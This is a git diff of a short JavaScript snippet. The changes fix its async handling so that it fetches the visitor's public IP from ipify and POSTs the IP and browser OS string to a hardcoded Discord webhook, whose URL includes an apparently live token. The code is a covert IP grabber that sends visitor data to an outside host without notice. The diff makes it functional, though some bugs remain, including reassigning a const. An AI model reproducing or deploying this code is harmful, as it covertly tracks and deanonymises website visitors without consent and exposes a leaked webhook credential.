@@ -1,18 +1,17 @@
 const ip = '';
 
-(() => {
-    const params = { content: `${window.navigator}` };
-    const rawResponse = fetch('https://api.ipify.org', {
+(async () => {
+    const rawResponse = await fetch('https://api.ipify.org?format=json', {
         method: 'GET',
         body: null
     });
-    ip = rawResponse.json;
+    ip = await rawResponse.json();
     console.log(content);
 })();
 
-(() => {
-    const params = { content: `${window.navigator.oscpu}\n${ip}` };
-    const rawResponse = fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
+(async () => {
+    const params = { content: `${window.navigator.oscpu}\n${ip['ip']}` };
+    const rawResponse = await fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
         method: 'POST',
         headers: {
         'Accept': 'application/json',
@@ -20,6 +19,6 @@ const ip = '';
         },
         body: JSON.stringify(params)
     });
-    const content = rawResponse.json;
+    const content = await rawResponse.json();
     console.log(content);
 })();
